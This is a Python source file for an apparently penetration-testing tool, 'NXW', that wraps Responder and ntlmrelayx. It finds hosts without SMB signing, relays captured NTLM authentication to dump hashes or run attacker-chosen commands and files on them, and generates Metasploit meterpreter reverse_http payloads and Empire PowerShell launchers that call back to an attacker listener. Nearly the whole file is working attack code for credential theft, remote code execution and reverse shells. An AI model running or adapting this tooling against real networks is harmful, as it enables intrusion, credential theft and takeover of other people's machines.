#! /usr/bin/python
# Written By Richard Davy
# @rd_pentest
# https://github.com/rmdavy
# Released under Apache V2 see LICENCE for more information
# 
import os, signal, sys, re, string, readline, subprocess, pyperclip
import netifaces as nic
import pexpect

try:
	from termcolor import colored 
except ImportError:
	print ('termcolor appears to be missing - try: pip install termcolor')
	exit(1)

#Try to account for different versions of Python
try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

#Routine handles Crtl+C
def signal_handler(signal, frame):
	print colored("\nCtrl+C pressed.. exiting...",'red')
	sys.exit()

# Exit Program
def quit():
	#Clean up tmp files
	if os.path.isfile("/tmp/nxhosts.txt"):
		os.remove("/tmp/nxhosts.txt")
	if os.path.isfile("/tmp/cmd.sh"):
		os.remove("/tmp/cmd.sh")
	if os.path.isfile("/tmp/empire.sh"):
		os.remove("/tmp/empire.sh")
	if os.path.isfile("/tmp/empire.rc"):
		os.remove("/tmp/empire.rc")
	if os.path.isfile("/tmp/msf_handler.rc"):
		os.remove("/tmp/msf_handler.rc")

	#exit
	sys.exit(0)

# Clear Screen
def clearscreen():
	main()

def enablerepsonderconf():
	#Clear Screen
	os.system('clear')
	#Check for string in file and modify accordingly using sed
	if 'SMB = Off' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating SMB = Off in /usr/share/responder/Responder.conf to SMB = On','yellow') 
		proc = subprocess.Popen("sed -i 's/SMB = Off/SMB = On/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
	#Check for string in file and modify accordingly using sed
	if 'HTTP = Off' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating HTTP = Off in /usr/share/responder/Responder.conf to HTTP = On','yellow') 
		proc = subprocess.Popen("sed -i 's/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)

def disableresponderconf():
	#Clear Screen
	os.system('clear')
	#Check for string in file and modify accordingly using sed
	if 'SMB = On' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating SMB = On in /usr/share/responder/Responder.conf to SMB = Off','yellow') 
		proc = subprocess.Popen("sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)
	#Check for string in file and modify accordingly using sed
	if 'HTTP = On' in open('/usr/share/responder/Responder.conf').read():
		print colored('[-]Updating HTTP = On in /usr/share/responder/Responder.conf to HTTP = Off','yellow') 
		proc = subprocess.Popen("sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf", stdout=subprocess.PIPE,shell=True)

def launchresponder():
	#Clear Screen
	os.system('clear')
	#Print Msg
	print colored('[+]Available Network Interfaces\n','yellow')
	#Iterate available interfaces and print
	for intf in nic.interfaces():
		print colored (intf,'green')
	#Get user selection
	int_response = raw_input("\n[+]Select interface for responder e.g. eth0:- ")
	print colored('\n[+]Starting Responder on '+int_response+'...','yellow')
	#Open new terminal window and start reponder on interface selected by use
	os.system("gnome-terminal -- \"bash\" -c \"responder -I "+int_response+" -r -d -w\"")

def getunsignedhosts():
	#Clear Screen
	os.system('clear')
	#Define list
	hosts = []
	#Check to see if RunFinger.py exists
	if os.path.isfile("/usr/share/responder/tools/RunFinger.py"):
		#Get input from user
		response = raw_input("[+]Please enter a subnet or IP to check for SMB Signing:- ")
		#Execute RunFinger
		proc = subprocess.Popen("python /usr/share/responder/tools/RunFinger.py -g -i "+response, stdout=subprocess.PIPE,shell=True)
		#Parse RunFinger findings for list of hosts where Signing is false
		for line in proc.communicate()[0].splitlines():
			if "Signing:'False'" in line:
				hosts.append(line[2:line.find("',")])
		
		if len(hosts)>0:
			#Write list of hosts to file
			f = open("/tmp/nxhosts.txt", "w")
			for host in hosts:
				f.write(host+"\n")
			print colored('[+]%s Host(s) written to file' % (len(hosts)),'yellow')
			f.close()
		else:
			print colored('[-]No hosts were found with SMB-Signing Disabled','yellow')

def relay_loot():
	#Clear Screen
	os.system('clear')
	#Check to see if hosts file exists then start attack	
	if os.path.isfile("/tmp/nxhosts.txt"):
		print colored('\n[+]Starting ntlmrelayx - Hashes will be looted and saved to local folder','yellow')
		#Execute ntlmrelayx in a new window - this will when a session is created dump hashes from the machine
		os.system("gnome-terminal -- \"bash\" -c \"python /usr/local/bin/ntlmrelayx.py -smb2support -tf /tmp/nxhosts.txt -l loot\"")
		#Launch Responder
		launchresponder()

def relay_execute_cmd():
	#Clear Screen
	os.system('clear')
	#Check to see if hosts file exists then start attack	
	if os.path.isfile("/tmp/nxhosts.txt"):
		cmd_response = raw_input("[+]Please enter the command to execute:- ")
		
		f = open("/tmp/cmd.sh", "w")
		f.write("python /usr/local/bin/ntlmrelayx.py -smb2support -tf /tmp/nxhosts.txt -c '%s'" % (cmd_response))
		f.close()

		if os.path.isfile("/tmp/cmd.sh"):
			os.system("chmod +x /tmp/cmd.sh")

		#Display messages 
		print colored('\n[+]Starting ntlmrelayx with Command Execution...','yellow') 
		#Execute ntlmrelayx in a new window
		os.system("gnome-terminal -- \"bash\" -c \"/tmp/cmd.sh\"")
		#Launch Responder
		launchresponder()

	if not os.path.isfile("/tmp/nxhosts.txt"):
		print colored('\n[-]Please generate a hosts file...','yellow') 

def relay_execute_file():
	#Clear Screen
	os.system('clear')
	#Check to see if hosts file exists then start attack	
	if os.path.isfile("/tmp/nxhosts.txt"):
		cmd_response = raw_input("[+]Please enter path of file to execute:- ")
		#Display messages 
		print colored('\n[+]Starting ntlmrelayx with File Execution...','yellow') 
		#Execute ntlmrelayx in a new window
		os.system("gnome-terminal -- \"bash\" -c \"python /usr/local/bin/ntlmrelayx.py -smb2support -tf /tmp/nxhosts.txt -e '"+cmd_response+"'\"")
		#Launch Responder
		launchresponder()

def empirelauncher():
	#Store Path to Empire for easy manipulation
	empirepath="/opt/Empire"
	#Clear Screen
	os.system('clear')

	if os.path.isdir(empirepath):
		print colored('[+]Configure Empire Details','yellow') 
		emp_listener_ip = raw_input("[+]Enter Listener IP:- ")
		emp_listener_port = raw_input("[+]Enter Listener Port:- ")

		#Create Launcher File
		f = open("/tmp/empire.rc", "w")
		f.write("listeners\n\n")
		f.write("uselistener http\n\n")
		f.write("set Name http%s\n\n" % (emp_listener_port))
		f.write("set Host http://%s:%s\n\n" % (emp_listener_ip,emp_listener_port))
		f.write("set Port %s\n\n" % (emp_listener_port))
		f.write("execute\n\n")
		f.write("launcher powershell\n\n")
		f.close()

		#Create Launcher File
		f = open("/tmp/empire.sh", "w")
		f.write("cd %s\n" % (empirepath))
		f.write("./empire -r /tmp/empire.rc\n")
		f.close()	
	
		#If bash launcher file is created change execute permissions
		if os.path.isfile("/tmp/empire.sh"):
			os.system("chmod +x /tmp/empire.sh")
		
		#Execute Empire with Resource File in New Window
		os.system("gnome-terminal -- \"bash\" -c \"/tmp/empire.sh\"")
	else:
		print colored('\n[-]Cannot find Empire Powershell in %s' % (empirepath),'yellow') 	

def msflauncher_psh():
	#Clear screen
	os.system('clear')
	#Configure payload
	msf_payload="windows/meterpreter/reverse_http"
	#Get details for payload
	print colored('[+]Configure Metasploit Payload - %s' % (msf_payload),'yellow') 
	msf_listener_ip = raw_input("[+]Enter Listener IP:- ")
	msf_listener_port = raw_input("[+]Enter Listener Port:- ")
	
	#Create metasploit resource file for handler
	msf_resource_file = open("/tmp/msf_handler.rc", "w")
	msf_resource_file.write("use multi/handler\n")
	msf_resource_file.write("set payload %s\n" % (msf_payload))
	msf_resource_file.write("set LHOST %s\n" % (msf_listener_ip))
	msf_resource_file.write("set LPORT %s\n" % (msf_listener_port))
	msf_resource_file.write("set ExitOnSession false\n")
	msf_resource_file.write("set EnableStageEncoding true\n")
	msf_resource_file.write("exploit -j -z")
	msf_resource_file.close()

	#Launch metasploit with resource file
	os.system("gnome-terminal -- \"bash\" -c \"msfconsole -r /tmp/msf_handler.rc \"")
	
	#Generate Powershell Payload
	output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh-cmd " % (msf_payload,msf_listener_ip,msf_listener_port))
	
	#Display Payload to screen and also copy to clipboard
	print colored('[+]MSF Powershell Payload Generated\n','yellow')
	#Truncate initial bit of string
	print output[output.find("powershell"):len(output)]
	#Display message
	print colored('\n[+]Launcher Copied to Clipboard\n','yellow')
	#Copy payload to clipboard
	pyperclip.copy(output[output.find("powershell"):len(output)])

def msflauncher_exe():
	#Clear screen
	os.system('clear')
	#configure variable
	msf_exename="/tmp/meta.exe"
	#Configure payload
	msf_payload="windows/meterpreter/reverse_http"
	#Get details for payload
	print colored('[+]Configure Metasploit Payload - %s' % (msf_payload),'yellow') 
	msf_listener_ip = raw_input("[+]Enter Listener IP:- ")
	msf_listener_port = raw_input("[+]Enter Listener Port:- ")
	
	#Create metasploit resource file for handler
	msf_resource_file = open("/tmp/msf_handler.rc", "w")
	msf_resource_file.write("use multi/handler\n")
	msf_resource_file.write("set payload %s\n" % (msf_payload))
	msf_resource_file.write("set LHOST %s\n" % (msf_listener_ip))
	msf_resource_file.write("set LPORT %s\n" % (msf_listener_port))
	msf_resource_file.write("set ExitOnSession false\n")
	msf_resource_file.write("set EnableStageEncoding true\n")
	msf_resource_file.write("exploit -j -z")
	msf_resource_file.close()

	#Launch metasploit with resource file
	print colored('[+]Launching Metasploit\n','yellow')
	os.system("gnome-terminal -- \"bash\" -c \"msfconsole -r /tmp/msf_handler.rc \"")
	
	#Generate EXE Payload
	output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f exe -o %s" % (msf_payload,msf_listener_ip,msf_listener_port,msf_exename))
	
	if os.path.isfile(msf_exename):
		#Display Payload to screen and also copy to clipboard
		print colored('[+]MSF Powershell Payload Generated %s , filepath copied to clipboard\n' % (msf_exename),'yellow')
		pyperclip.copy(msf_exename)

def payload_menu():
	#Clear Screen
	os.system('clear')
	# Display options to the user
	print("\nPayload Selection:")
	print("\n\t(1)\tGenerate Metasploit Powershell Launcher")
	print("\t(2)\tGenerate Metasploit EXE Launcher")
	print("\t(3)\tGenerate Empire PowerShell Launcher")
	print("\t(99)\tBack to Main Menu")

	options = {1: msflauncher_psh,
			2: msflauncher_exe,
			3: empirelauncher,
			99: main,
	}

	# Generate payload
	try:
		payload_option = input("\nSelect payload: ")
		options[payload_option ]()
	except KeyError:
		pass

def main():
	#Clear Screen
	os.system('clear')
	#Display Banner
	print '\n'
	print colored('NXW - NTLM-RelayX Wrapper','green')
	print colored('Version 1.1 ','yellow')
	print colored('By @rd_pentest','blue') 
	
	#Quick check to see whether the necessary files are installed
	if not os.path.isfile("/usr/share/responder/tools/RunFinger.py"):
		print colored('\n[-]File not found - /usr/share/responder/tools/RunFinger.py','yellow') 

	if not os.path.isfile("/usr/local/bin/ntlmrelayx.py"):
		print colored('\n[-]File not found - /usr/local/bin/ntlmrelayx.py\n','yellow') 

	#Print menu to screen
	while(1):
		print("\n\t(1)\tTurn On SMB and HTTP in Responder.conf")
		print("\t(2)\tTurn Off SMB and HTTP in Responder.conf")
		print("\t(3)\tGenerate list of hosts with SMB-Signing Disabled")
		print("\t(4)\tLaunch NTLM-RelayX Attack and gather l00t")
		print("\t(5)\tLaunch NTLM-RelayX Attack and Execute file")
		print("\t(6)\tLaunch NTLM-RelayX Attack and Execute command")
		print("\t(7)\tGenerate Payload")
		print("\t(99)\tQuit")
		#User options
		options = {1: enablerepsonderconf,
					2: disableresponderconf,
					3: getunsignedhosts,
					4: relay_loot,
					5: relay_execute_file,
					6: relay_execute_cmd,
					7: payload_menu,
					98: clearscreen,
					99: quit,
		}
		try:
			task = input("\nSelect a task: ")
			options[task]()
		except KeyError:
			pass

if __name__ == '__main__':
	#Setup Signal handler in case of Ctrl+C
	signal.signal(signal.SIGINT, signal_handler)
	#Call main routine.
	main()